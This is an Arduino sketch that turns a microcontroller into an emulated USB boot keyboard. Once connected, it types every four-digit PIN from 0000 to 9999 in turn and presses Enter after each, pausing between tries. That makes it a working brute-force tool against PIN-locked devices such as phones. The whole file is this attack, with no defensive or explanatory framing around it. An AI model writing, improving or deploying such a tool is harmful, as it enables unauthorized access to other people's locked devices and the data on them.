#define CDC_DISABLED
#define DEVICE_CLASS      0x00 // Default 0xEF
#define DEVICE_SUB_CLASS  0x00 // Default 0x02
#define DEVICE_PROTOCOL   0x00 // Default 0x01

#include "HID-Project.h"

const int pinLed = LED_BUILTIN;
const int pinButton = 2;
int counter = 0;
int fakecounter = counter;
char pin[]="xxxx";

void setup() {
  pinMode(pinLed, OUTPUT);
  pinMode(pinButton, INPUT_PULLUP);

  // Sends a clean report to the host. This is important on any Arduino type.
  BootKeyboard.begin();
}


void loop() {
if (counter <= 9999){
      delay(5000);
sprintf(pin, "%04d", fakecounter);
    BootKeyboard.press(pin[0]);
    delay(100);
    BootKeyboard.releaseAll();
    delay(400);

    BootKeyboard.press(pin[1]);
    delay(100);
    BootKeyboard.releaseAll();
    delay(400);

    BootKeyboard.press(pin[2]);
    delay(100);
    BootKeyboard.releaseAll();
    delay(400);

    BootKeyboard.press(pin[3]);
    delay(100);
    BootKeyboard.releaseAll();
    delay(400);

    BootKeyboard.press(KEY_ENTER);
    delay(100);
    BootKeyboard.releaseAll();
    delay(10000);
 
}
++counter;
fakecounter = counter;
}